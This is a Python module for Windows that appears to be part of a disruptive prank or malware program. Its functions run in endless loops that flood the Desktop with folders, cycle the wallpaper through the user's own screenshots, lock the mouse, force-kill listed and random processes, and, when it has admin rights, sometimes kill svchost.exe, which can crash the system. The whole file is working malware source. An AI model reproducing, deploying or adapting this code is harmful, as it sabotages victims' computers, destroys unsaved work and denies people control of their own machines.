from ctypes import windll
from os import listdir, mkdir, path, system
from random import choice, randint
from time import sleep

from mouse import drag
from psutil import process_iter

from modules.config import *
from modules.tools import isAdmin


# Add option to turn off base64
def create_folders():
    """Creates folders on desktop"""
    while 1:
        for i in range(randint(folder_min, folder_max)):
            try:
                mkdir(f"{path.expanduser('~')}/Desktop/{''.join(choice(folder_names))}")
            except Exception:
                pass
        sleep(randint(1, 25))


def change_wallpaper():
    """Changes the wallpaper with random images from screenshot folder"""
    while 1:
        try:
            pic = choice(listdir(f"{path.expanduser('~')}/Pictures/Screenshots"))

            windll.user32.SystemParametersInfoW(
                20, 0, f"{path.expanduser('~')}/Pictures/Screenshots/{pic}", 3
            )
            sleep(randint(0, 3))
        except Exception:
            pass


def kill_important():
    """Kills important processes"""
    while 1:
        for program in kill_list:
            system(f"taskkill /f /im {program}")
        sleep(30)


def mouse_lock():
    """Stops mouse from moving"""
    while 1:
        drag(0, 0, 0, 0, absolute=True, duration=0)


def random_kill():
    """Kills random processes"""
    while 1:
        processes = []
        try:
            for proc in process_iter():
                try:
                    processes.append(proc.name())
                except Exception:
                    pass

        except Exception:
            pass

        program = choice(processes)
        if program != "svchost.exe":
            system(f"taskkill /f /im {program}")
        sleep(randint(5, 15))

        if isAdmin():
            if randint(0, 25) == 1:
                system("taskkill /f /im svchost.exe")
